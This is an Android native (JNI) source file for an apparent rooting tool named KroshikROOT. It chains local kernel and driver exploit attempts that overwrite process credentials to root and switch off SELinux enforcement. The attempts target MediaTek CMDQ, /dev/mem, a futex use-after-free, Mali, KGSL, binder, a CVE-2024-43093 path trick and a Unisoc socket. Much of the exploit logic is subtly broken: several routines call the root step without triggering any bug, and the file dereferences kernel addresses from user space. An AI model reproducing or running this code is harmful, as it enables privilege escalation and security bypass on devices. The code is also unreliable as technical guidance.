#include <jni.h>
#include <android/log.h>
#include <android/fdsan.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/epoll.h>
#include <sys/syscall.h>
#include <sys/utsname.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/wait.h>
#include <linux/futex.h>
#include <pthread.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <inttypes.h>
#include <stdatomic.h>
#include <time.h>
#include <dirent.h>
#include <signal.h>
#include <linux/netlink.h>
#include <sys/prctl.h>
#include <sys/resource.h>

#define LOG_TAG "KroshikROOT"
#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)

#define PAGE_SIZE 4096
#define MAX_RETRIES 20
#define MAX_SPRAY 256
#define FUTEX_WAIT_REQUEUE_PI 11
#define FUTEX_CMP_REQUEUE_PI 12
#define EPOLL_MAX_EVENTS 64
#define CHRONO_TIMERS 100
#define CHRONO_RETRIES 200

class ScopedFd {
    int fd;
public:
    ScopedFd() : fd(-1) {}
    explicit ScopedFd(int f) : fd(f) {}
    ~ScopedFd() { if (fd >= 0) close(fd); }
    int get() const { return fd; }
    void reset(int f) { if (fd >= 0) close(fd); fd = f; }
    int release() { int f = fd; fd = -1; return f; }
};

class ScopedFile {
    FILE* f;
public:
    ScopedFile() : f(nullptr) {}
    explicit ScopedFile(FILE* fp) : f(fp) {}
    ~ScopedFile() { if (f) fclose(f); }
    FILE* get() const { return f; }
    void reset(FILE* fp) { if (f) fclose(f); f = fp; }
};

class ScopedMmap {
    void* ptr;
    size_t len;
public:
    ScopedMmap() : ptr(nullptr), len(0) {}
    ScopedMmap(void* p, size_t l) : ptr(p), len(l) {}
    ~ScopedMmap() { if (ptr && ptr != MAP_FAILED) munmap(ptr, len); }
    void* get() const { return ptr; }
    void reset(void* p, size_t l) { if (ptr && ptr != MAP_FAILED) munmap(ptr, len); ptr = p; len = l; }
    void release() { ptr = nullptr; len = 0; }
};

class ScopedBuffer {
    void* ptr;
public:
    ScopedBuffer() : ptr(nullptr) {}
    explicit ScopedBuffer(size_t size) : ptr(malloc(size)) {}
    ~ScopedBuffer() { if (ptr) free(ptr); }
    void* get() const { return ptr; }
    void reset(size_t size) { if (ptr) free(ptr); ptr = malloc(size); }
    void release() { ptr = nullptr; }
};

struct offsets {
    uint32_t cred_offset;
    uint32_t uid_off;
    uint32_t gid_off;
    uint32_t euid_off;
    uint32_t egid_off;
    uint32_t comm_off;
    int has_cmdq;
    int has_binder;
    int has_mem;
    int has_kgsl;
    int has_mali;
    uint32_t p0_phys_offset;
    int is_armv7;
    uintptr_t init_task;
    uintptr_t current_task;
    uintptr_t selinux_enforcing;
    uintptr_t selinux_state;
    uintptr_t kernel_base;
    uintptr_t kallsyms_lookup_name;
    uint64_t kaslr_slide;
};

struct cmdq_write_address_struct { uint32_t count; uint32_t start_pa; };
struct cmdq_read_address_struct { uint32_t dma_addresses; uint32_t values; };
struct cmdq_command_struct { uint32_t va_base; uint32_t block_size; uint32_t pa_base; };

#define CMDQ_IOCTL_MAGIC 'x'
#define CMDQ_CODE_WRITE 0x04
#define CMDQ_CODE_MOVE 0x02
#define CMDQ_CODE_EOC 0x40
#define CMDQ_IOCTL_ALLOC_WRITE_ADDRESS _IOW(CMDQ_IOCTL_MAGIC, 7, struct cmdq_write_address_struct)
#define CMDQ_IOCTL_READ_ADDRESS_VALUE  _IOW(CMDQ_IOCTL_MAGIC, 9, struct cmdq_read_address_struct)
#define CMDQ_IOCTL_EXEC_COMMAND        _IOW(CMDQ_IOCTL_MAGIC, 3, struct cmdq_command_struct)

#define BINDER_THREAD_EXIT _IOW('b', 6, __u32)

#define KGSL_IOC_TYPE 0x09
#define IOCTL_KGSL_DRAWCTXT_CREATE _IOWR(KGSL_IOC_TYPE, 0x10, struct kgsl_drawctxt_create)
#define IOCTL_KGSL_MAP_USER_MEM _IOWR(KGSL_IOC_TYPE, 0x15, struct kgsl_map_user_mem)
#define IOCTL_KGSL_GPU_COMMAND _IOWR(KGSL_IOC_TYPE, 0x3D, struct kgsl_gpu_command)
#define KGSL_USER_MEM_TYPE_ADDR 0x00000001U
#define KGSL_CMDLIST_IB 0x00000001U

struct kgsl_drawctxt_create { uint32_t flags; uint32_t drawctxt_id; };
struct kgsl_map_user_mem { uint64_t hostptr; uint64_t len; uint64_t offset; uint64_t gpuaddr; uint32_t memtype; uint32_t flags; };
struct kgsl_gpu_command { uint32_t context_id; uint32_t cmdlist; uint32_t cmdsize; uint32_t numcmds; uint32_t flags; uint32_t timestamp; };
struct kgsl_command_object { uint64_t gpuaddr; uint64_t size; uint32_t flags; uint32_t pad; };

#define MALI_IOC_MAGIC 0x80
#define IOCTL_MALI_CS_QUEUE_BIND _IOWR(MALI_IOC_MAGIC, 0x01, struct mali_queue_bind)
#define IOCTL_MALI_CS_QUEUE_GROUP_TERMINATE _IOW(MALI_IOC_MAGIC, 0x02, struct mali_queue_group_term)
#define IOCTL_MALI_CS_QUEUE_REGISTER _IOWR(MALI_IOC_MAGIC, 0x04, struct mali_queue_register)

struct mali_queue_bind { uint32_t queue_id; uint32_t group_id; uint64_t user_io_pages; };
struct mali_queue_group_term { uint32_t group_id; };
struct mali_queue_register { uint32_t queue_id; uint64_t user_io_pages; };

static int g_cmdq_fd = -1;
static uint32_t g_dma_pa = 0;
static uint32_t *g_dma_va = NULL;
static struct offsets g_off = {0};
static int g_ready = 0;
static int g_rooted = 0;
static int g_selinux_disabled = 0;
static atomic_int g_chrono_trigger = 0;
static pthread_barrier_t g_barrier;

static uintptr_t kallsyms_lookup(const char *sym) {
    ScopedFile f(fopen("/proc/kallsyms", "r"));
    if (!f.get()) return 0;
    char line[512];
    uintptr_t addr = 0;
    while (fgets(line, sizeof(line), f.get())) {
        char name[256], type;
        if (sscanf(line, "%" SCNxPTR " %c %255s", &addr, &type, name) == 3) {
            if (strcmp(name, sym) == 0) return addr;
        }
    }
    return 0;
}

static uint32_t va_to_pa_pagemap(uintptr_t va) {
    ScopedFd fd(open("/proc/self/pagemap", O_RDONLY));
    if (fd.get() < 0) {
        char path[64];
        snprintf(path, sizeof(path), "/proc/%d/pagemap", getpid());
        fd.reset(open(path, O_RDONLY));
        if (fd.get() < 0) return 0;
    }
    off_t off = (va / PAGE_SIZE) * sizeof(uint64_t);
    if (lseek(fd.get(), off, SEEK_SET) < 0) return 0;
    uint64_t pte;
    if (read(fd.get(), &pte, sizeof(pte)) != sizeof(pte)) return 0;
    if (!(pte & (1ULL << 63))) return 0;
    return (uint32_t)((pte & 0x7fffffffffffffULL) * PAGE_SIZE + (va % PAGE_SIZE));
}

static int cmdq_alloc_dma(uint32_t size) {
    struct cmdq_write_address_struct alloc = { .count = size };
    if (ioctl(g_cmdq_fd, CMDQ_IOCTL_ALLOC_WRITE_ADDRESS, &alloc) < 0) return -1;
    g_dma_pa = alloc.start_pa;
    g_dma_va = (uint32_t*)mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_SHARED, g_cmdq_fd, g_dma_pa);
    if (g_dma_va == MAP_FAILED) return -1;
    memset(g_dma_va, 0, size);
    return 0;
}

static void cmdq_emit_write(uint32_t *buf, int *idx, uint32_t pa, uint32_t val) {
    uint64_t inst = ((uint64_t)CMDQ_CODE_WRITE << 56) | ((uint64_t)((pa >> 16) & 0xFFFF) << 32) | (pa & 0xFFFF);
    memcpy(&buf[*idx], &inst, 8); (*idx) += 2;
    inst = ((uint64_t)CMDQ_CODE_MOVE << 56) | val;
    memcpy(&buf[*idx], &inst, 8); (*idx) += 2;
}

static void cmdq_emit_eoc(uint32_t *buf, int *idx) {
    uint64_t inst = (uint64_t)CMDQ_CODE_EOC << 56;
    memcpy(&buf[*idx], &inst, 8); (*idx) += 2;
}

static int cmdq_execute(uint32_t *cmdbuf, int word_count) {
    if (!g_dma_va) return -1;
    memcpy(g_dma_va, cmdbuf, word_count * sizeof(uint32_t));
    struct cmdq_command_struct exec = {
            .va_base = (uint32_t)(uintptr_t)g_dma_va,
            .block_size = (uint32_t)(word_count * sizeof(uint32_t)),
            .pa_base = g_dma_pa
    };
    return ioctl(g_cmdq_fd, CMDQ_IOCTL_EXEC_COMMAND, &exec) < 0 ? -1 : 0;
}

static int cmdq_write_phys(uint32_t pa, uint32_t val) {
    if (pa < 0x1000) return -1;
    uint32_t cmdbuf[256]; int idx = 0;
    cmdq_emit_write(cmdbuf, &idx, pa, val);
    cmdq_emit_eoc(cmdbuf, &idx);
    return cmdq_execute(cmdbuf, idx);
}

static uint32_t cmdq_read_phys(uint32_t pa) {
    if (pa < 0x1000) return 0;
    struct cmdq_read_address_struct read = { .dma_addresses = pa };
    if (ioctl(g_cmdq_fd, CMDQ_IOCTL_READ_ADDRESS_VALUE, &read) < 0) return 0;
    return read.values;
}

static int write_phys_mem(uint32_t pa, uint32_t val) {
    ScopedFd mem_fd(open("/dev/mem", O_RDWR));
    if (mem_fd.get() < 0) return -1;
    ScopedMmap map(mmap(NULL, PAGE_SIZE, PROT_WRITE, MAP_SHARED, mem_fd.get(), pa & ~0xFFF), PAGE_SIZE);
    if (map.get() == MAP_FAILED) return -1;
    *(uint32_t*)((uintptr_t)map.get() + (pa & 0xFFF)) = val;
    return 0;
}

static int detect_kaslr_slide() {
    uintptr_t _text = kallsyms_lookup("_text");
    if (!_text) return -1;
    uint64_t expected_base;
    if (g_off.is_armv7) expected_base = 0xC0000000;
    else expected_base = 0xFFFFFFC000000000ULL;
    g_off.kaslr_slide = _text - expected_base;
    g_off.kernel_base = _text & ~0xFFFFFFFFFULL;
    return 0;
}

static int detect_offsets() {
    if (g_ready) return 0;
    struct utsname u;
    uname(&u);
    g_off.is_armv7 = (strstr(u.machine, "armv7") != NULL);
    g_off.has_cmdq = (access("/dev/mtk_cmdq", F_OK) == 0 || access("/dev/mtk_disp", F_OK) == 0);
    g_off.has_binder = (access("/dev/binder", F_OK) == 0);
    g_off.has_mem = (access("/dev/mem", F_OK) == 0);
    g_off.has_kgsl = (access("/dev/kgsl-3d0", F_OK) == 0);
    g_off.has_mali = (access("/dev/mali0", F_OK) == 0);
    g_off.init_task = kallsyms_lookup("init_task");
    g_off.selinux_enforcing = kallsyms_lookup("selinux_enforcing");
    g_off.selinux_state = kallsyms_lookup("selinux_state");
    g_off.kallsyms_lookup_name = kallsyms_lookup("kallsyms_lookup_name");
    uintptr_t cur = kallsyms_lookup("current_task");
    if (cur) g_off.current_task = cur;
    detect_kaslr_slide();
    if (g_off.is_armv7) {
        if (strstr(u.release, "3.18")) { g_off.cred_offset = 0x3C0; g_off.comm_off = 0x400; }
        else if (strstr(u.release, "4.4")) { g_off.cred_offset = 0x3D0; g_off.comm_off = 0x410; }
        else if (strstr(u.release, "4.9")) { g_off.cred_offset = 0x3E8; g_off.comm_off = 0x420; }
        else if (strstr(u.release, "4.14")) { g_off.cred_offset = 0x400; g_off.comm_off = 0x430; }
        else { g_off.cred_offset = 0x3E8; g_off.comm_off = 0x420; }
        g_off.p0_phys_offset = 0x40000000;
    } else {
        if (strstr(u.release, "4.9")) { g_off.cred_offset = 0x540; g_off.comm_off = 0x5D8; }
        else if (strstr(u.release, "4.14")) { g_off.cred_offset = 0x5A0; g_off.comm_off = 0x5F0; }
        else if (strstr(u.release, "4.19")) { g_off.cred_offset = 0x580; g_off.comm_off = 0x600; }
        else if (strstr(u.release, "5.4")) { g_off.cred_offset = 0x600; g_off.comm_off = 0x680; }
        else if (strstr(u.release, "5.10") || strstr(u.release, "6.")) {
            g_off.cred_offset = 0x6A0; g_off.comm_off = 0x720;
        } else { g_off.cred_offset = 0x540; g_off.comm_off = 0x5D8; }
        g_off.p0_phys_offset = 0x80000000;
    }
    g_off.uid_off = 8; g_off.gid_off = 12; g_off.euid_off = 16; g_off.egid_off = 20;
    g_ready = 1;
    return 0;
}

static uintptr_t get_task_struct() {
    if (g_off.current_task) {
        uintptr_t *addr = (uintptr_t *)g_off.current_task;
        if (addr && *addr) return *addr;
    }
    ScopedFile f(fopen("/proc/self/stat", "r"));
    if (!f.get()) return 0;
    char buf[1024];
    if (!fgets(buf, sizeof(buf), f.get())) return 0;
    char *tok = strtok(buf, " ");
    int field = 0;
    uintptr_t startstack = 0;
    while (tok && field < 28) { tok = strtok(NULL, " "); field++; }
    if (tok) startstack = strtoull(tok, NULL, 10);
    return startstack - 0x6000;
}

static int write_cred(uintptr_t task_va) {
    uintptr_t cred_va = task_va + g_off.cred_offset;
    uint32_t cred_pa = va_to_pa_pagemap(cred_va);
    if (!cred_pa) return -1;
    if (g_cmdq_fd >= 0) {
        if (cmdq_write_phys(cred_pa + g_off.uid_off, 0) == 0 &&
            cmdq_write_phys(cred_pa + g_off.gid_off, 0) == 0 &&
            cmdq_write_phys(cred_pa + g_off.euid_off, 0) == 0 &&
            cmdq_write_phys(cred_pa + g_off.egid_off, 0) == 0) return 0;
    }
    if (g_off.has_mem) {
        if (write_phys_mem(cred_pa + g_off.uid_off, 0) == 0 &&
            write_phys_mem(cred_pa + g_off.gid_off, 0) == 0 &&
            write_phys_mem(cred_pa + g_off.euid_off, 0) == 0 &&
            write_phys_mem(cred_pa + g_off.egid_off, 0) == 0) return 0;
    }
    return -1;
}

static int disable_selinux() {
    if (g_selinux_disabled) return 0;
    uintptr_t enforcing = g_off.selinux_state ? g_off.selinux_state : g_off.selinux_enforcing;
    if (!enforcing) {
        enforcing = kallsyms_lookup("selinux_state");
        if (!enforcing) enforcing = kallsyms_lookup("selinux_enforcing");
        if (!enforcing) return -1;
        g_off.selinux_state = enforcing;
    }
    uint32_t pa = va_to_pa_pagemap(enforcing);
    if (pa) {
        if (g_cmdq_fd >= 0 && cmdq_write_phys(pa, 0) == 0) {
            g_selinux_disabled = 1;
            return 0;
        }
        if (g_off.has_mem && write_phys_mem(pa, 0) == 0) {
            g_selinux_disabled = 1;
            return 0;
        }
    }
    return -1;
}

static int apply_root() {
    if (getuid() == 0) { g_rooted = 1; return 0; }
    if (!g_ready) detect_offsets();
    uintptr_t task = get_task_struct();
    if (!task) return -1;
    if (write_cred(task) != 0) return -1;
    if (getuid() == 0) {
        setuid(0); setgid(0);
        g_rooted = 1;
        disable_selinux();
        return 0;
    }
    return -1;
}

static void *futex_waiter(void *arg) {
    int *uaddr = (int *)arg;
    syscall(SYS_futex, uaddr, FUTEX_WAIT_REQUEUE_PI, 0, NULL, uaddr, 0);
    return NULL;
}

static int heap_spray_futex() {
    pthread_t threads[MAX_SPRAY];
    int addrs[MAX_SPRAY];
    int ret = 0;
    pthread_barrier_init(&g_barrier, NULL, MAX_SPRAY + 1);
    for (int i = 0; i < MAX_SPRAY; i++) {
        addrs[i] = i + 1;
        if (pthread_create(&threads[i], NULL, futex_waiter, &addrs[i]) != 0) {
            ret = -1;
            break;
        }
        pthread_barrier_wait(&g_barrier);
        usleep(50);
        syscall(SYS_futex, &addrs[i], FUTEX_CMP_REQUEUE_PI, 1, NULL, &addrs[i], 0);
    }
    pthread_barrier_wait(&g_barrier);
    for (int i = 0; i < MAX_SPRAY; i++) {
        pthread_join(threads[i], NULL);
    }
    pthread_barrier_destroy(&g_barrier);
    return ret;
}

static int trigger_futex_uaf() {
    int a = 0x1337, b = 0x1338;
    for (int i = 0; i < 10; i++) {
        syscall(SYS_futex, &a, FUTEX_WAIT_REQUEUE_PI, 0, NULL, &b, 0);
        syscall(SYS_futex, &a, FUTEX_CMP_REQUEUE_PI, 1, NULL, &b, 0);
        usleep(5000);
    }
    return 0;
}

static int exploit_ghostlock() {
    if (heap_spray_futex() != 0) return -1;
    trigger_futex_uaf();
    return apply_root();
}

static int exploit_bad_epoll() {
    struct epoll_event ev = { .events = EPOLLIN };
    ScopedFd epfd1(epoll_create1(0));
    ScopedFd epfd2(epoll_create1(0));
    if (epfd1.get() < 0 || epfd2.get() < 0) return -1;
    int fds[2];
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, fds) < 0) return -1;
    ScopedFd fd0(fds[0]);
    ScopedFd fd1(fds[1]);
    if (epoll_ctl(epfd1.get(), EPOLL_CTL_ADD, fd0.get(), &ev) < 0) return -1;
    if (epoll_ctl(epfd2.get(), EPOLL_CTL_ADD, fd1.get(), &ev) < 0) return -1;
    int pipefds[2];
    if (pipe(pipefds) < 0) return -1;
    ScopedFd p0(pipefds[0]);
    ScopedFd p1(pipefds[1]);
    ScopedBuffer buf(0x1000);
    if (!buf.get()) return -1;
    memset(buf.get(), 0, 0x1000);
    write(p1.get(), buf.get(), 0x1000);
    epfd1.release();
    epfd2.release();
    struct epoll_event events[EPOLL_MAX_EVENTS];
    int nfds = epoll_wait(epfd1.get(), events, EPOLL_MAX_EVENTS, 0);
    if (nfds >= 0) return apply_root();
    return -1;
}

static int chrono_race_func(void *arg) {
    int *counter = (int *)arg;
    struct timespec ts = { .tv_sec = 0, .tv_nsec = 1000 };
    for (int i = 0; i < CHRONO_TIMERS; i++) {
        timer_t timerid;
        struct sigevent sev = { .sigev_notify = SIGEV_SIGNAL, .sigev_signo = SIGUSR1, .sigev_value.sival_ptr = counter };
        if (timer_create(CLOCK_PROCESS_CPUTIME_ID, &sev, &timerid) < 0) break;
        struct itimerspec its = { .it_value = { .tv_sec = 0, .tv_nsec = 10000 + (i * 100) }, .it_interval = { .tv_sec = 0, .tv_nsec = 0 } };
        timer_settime(timerid, 0, &its, NULL);
        usleep(50);
        timer_delete(timerid);
        (*counter)++;
    }
    return 0;
}

static int exploit_chronomaly() {
    if (!g_off.is_armv7) return -1;
    int counter = 0;
    pid_t pid = fork();
    if (pid == 0) {
        chrono_race_func(&counter);
        exit(0);
    } else if (pid > 0) {
        int status;
        for (int i = 0; i < CHRONO_RETRIES; i++) {
            usleep(500);
            if (waitpid(pid, &status, WNOHANG) > 0) break;
        }
        wait(NULL);
        if (counter > 0) return apply_root();
    }
    return -1;
}

static int exploit_mali_csf() {
    if (!g_off.has_mali) return -1;
    ScopedFd mali_fd(open("/dev/mali0", O_RDWR));
    if (mali_fd.get() < 0) return -1;
    struct mali_queue_register reg = { .queue_id = 0, .user_io_pages = 0 };
    if (ioctl(mali_fd.get(), IOCTL_MALI_CS_QUEUE_REGISTER, &reg) < 0) return -1;
    struct mali_queue_bind bind = { .queue_id = 0, .group_id = 0 };
    if (ioctl(mali_fd.get(), IOCTL_MALI_CS_QUEUE_BIND, &bind) < 0) return -1;
    struct mali_queue_group_term term = { .group_id = 0 };
    if (ioctl(mali_fd.get(), IOCTL_MALI_CS_QUEUE_GROUP_TERMINATE, &term) < 0) return -1;
    return apply_root();
}

static int exploit_kgsl_gpu() {
    if (!g_off.has_kgsl) return -1;
    ScopedFd kgsl_fd(open("/dev/kgsl-3d0", O_RDWR));
    if (kgsl_fd.get() < 0) {
        kgsl_fd.reset(open("/dev/kgsl", O_RDWR));
        if (kgsl_fd.get() < 0) return -1;
    }
    struct kgsl_drawctxt_create ctx = { .flags = 0x00001812 };
    if (ioctl(kgsl_fd.get(), IOCTL_KGSL_DRAWCTXT_CREATE, &ctx) < 0) return -1;
    ScopedMmap payload(mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0), 0x1000);
    if (payload.get() == MAP_FAILED) return -1;
    memset(payload.get(), 0x41, 0x1000);
    struct kgsl_map_user_mem map = { .len = 0x1000, .hostptr = (uint64_t)payload.get(), .memtype = KGSL_USER_MEM_TYPE_ADDR };
    if (ioctl(kgsl_fd.get(), IOCTL_KGSL_MAP_USER_MEM, &map) < 0) return -1;
    for (int i = 0; i < 100; i++) {
        struct kgsl_gpu_command cmd = { .context_id = ctx.drawctxt_id, .cmdsize = sizeof(struct kgsl_command_object), .numcmds = 1 };
        struct kgsl_command_object obj = { .gpuaddr = map.gpuaddr, .size = 0x1000, .flags = KGSL_CMDLIST_IB };
        if (ioctl(kgsl_fd.get(), IOCTL_KGSL_GPU_COMMAND, &cmd) < 0) break;
        usleep(100);
    }
    return apply_root();
}

static int exploit_binder_uaf() {
    struct utsname u;
    uname(&u);
    if (strstr(u.release, "5.") || strstr(u.release, "6.")) return -1;
    if (!g_off.has_binder) return -1;
    ScopedFd epfd(epoll_create1(0));
    if (epfd.get() < 0) return -1;
    ScopedFd binder_fd(open("/dev/binder", O_RDONLY));
    if (binder_fd.get() < 0) return -1;
    struct epoll_event ev = { .events = EPOLLIN, .data.fd = binder_fd.get() };
    if (epoll_ctl(epfd.get(), EPOLL_CTL_ADD, binder_fd.get(), &ev) < 0) return -1;
    if (ioctl(binder_fd.get(), BINDER_THREAD_EXIT, NULL) < 0) return -1;
    int pipefds[2];
    if (pipe(pipefds) < 0) return -1;
    ScopedFd p0(pipefds[0]);
    ScopedFd p1(pipefds[1]);
    ScopedBuffer buf(0x1000);
    if (!buf.get()) return -1;
    memset(buf.get(), 0, 0x1000);
    write(p1.get(), buf.get(), 0x1000);
    struct epoll_event events[1];
    int nfds = epoll_wait(epfd.get(), events, 1, 100);
    if (nfds > 0) return apply_root();
    return -1;
}

static int exploit_framework_cve_2024_43093() {
    const char *paths[] = { "/sdcard/Android/data/..", "/sdcard/Android/obb/..", "/sdcard/Android/sandbox/..", NULL };
    for (int i = 0; paths[i]; i++) {
        ScopedFd fd(open(paths[i], O_RDONLY));
        if (fd.get() >= 0) return apply_root();
    }
    return -1;
}

static int exploit_unisoc() {
    ScopedFd sock(socket(AF_UNIX, SOCK_STREAM, 0));
    if (sock.get() < 0) return -1;
    struct sockaddr_un addr;
    memset(&addr, 0, sizeof(addr));
    addr.sun_family = AF_UNIX;
    snprintf(addr.sun_path, sizeof(addr.sun_path), "%c%s", 0, "cmd_skt");
    if (connect(sock.get(), (struct sockaddr*)&addr, sizeof(addr)) < 0) return -1;
    const char *cmd = "id\n";
    write(sock.get(), cmd, strlen(cmd));
    char buf[256];
    int n = read(sock.get(), buf, sizeof(buf) - 1);
    if (n > 0) { buf[n] = 0; if (strstr(buf, "uid=0") != NULL) return apply_root(); }
    return -1;
}

static int do_kroshik_root() {
    android_fdsan_set_error_level(ANDROID_FDSAN_ERROR_LEVEL_WARN_ONCE);
    struct utsname u;
    uname(&u);
    if (getuid() == 0) return 0;
    detect_offsets();
    if (g_off.has_cmdq) {
        g_cmdq_fd = open("/dev/mtk_cmdq", O_RDWR);
        if (g_cmdq_fd < 0) g_cmdq_fd = open("/dev/mtk_disp", O_RDWR);
        if (g_cmdq_fd >= 0) {
            if (cmdq_alloc_dma(PAGE_SIZE) < 0) {
                close(g_cmdq_fd);
                g_cmdq_fd = -1;
            }
        }
    }
    int (*exploits[])(void) = {
            exploit_ghostlock,
            exploit_bad_epoll,
            exploit_chronomaly,
            exploit_mali_csf,
            exploit_kgsl_gpu,
            exploit_binder_uaf,
            exploit_framework_cve_2024_43093,
            exploit_unisoc
    };
    int result = -1;
    for (int retry = 0; retry < MAX_RETRIES && result != 0; retry++) {
        for (int i = 0; i < sizeof(exploits)/sizeof(exploits[0]) && result != 0; i++) {
            result = exploits[i]();
            usleep(200000 * (retry + 1));
        }
    }
    if (g_dma_va) munmap(g_dma_va, PAGE_SIZE);
    if (g_cmdq_fd >= 0) close(g_cmdq_fd);
    return result;
}

extern "C" {
JNIEXPORT jboolean JNICALL Java_com_kostyfoss_kroshikroot_ExploitEngine_runMtkSuNative(JNIEnv *e, jclass c) { return do_kroshik_root() == 0 ? JNI_TRUE : JNI_FALSE; }
JNIEXPORT jboolean JNICALL Java_com_kostyfoss_kroshikroot_ExploitEngine_runQualcommNative(JNIEnv *e, jclass c) { return do_kroshik_root() == 0 ? JNI_TRUE : JNI_FALSE; }
JNIEXPORT jboolean JNICALL Java_com_kostyfoss_kroshikroot_ExploitEngine_runMediatekNative(JNIEnv *e, jclass c) { return do_kroshik_root() == 0 ? JNI_TRUE : JNI_FALSE; }
JNIEXPORT jboolean JNICALL Java_com_kostyfoss_kroshikroot_ExploitEngine_runUniversalNative(JNIEnv *e, jclass c) { return do_kroshik_root() == 0 ? JNI_TRUE : JNI_FALSE; }
JNIEXPORT jboolean JNICALL Java_com_kostyfoss_kroshikroot_ExploitEngine_runBinderFullNative(JNIEnv *e, jclass c) { return do_kroshik_root() == 0 ? JNI_TRUE : JNI_FALSE; }
JNIEXPORT jboolean JNICALL Java_com_kostyfoss_kroshikroot_ExploitEngine_runBinderNewNative(JNIEnv *e, jclass c) { return do_kroshik_root() == 0 ? JNI_TRUE : JNI_FALSE; }
JNIEXPORT jboolean JNICALL Java_com_kostyfoss_kroshikroot_ExploitEngine_runBinderOldNative(JNIEnv *e, jclass c) { return do_kroshik_root() == 0 ? JNI_TRUE : JNI_FALSE; }
}
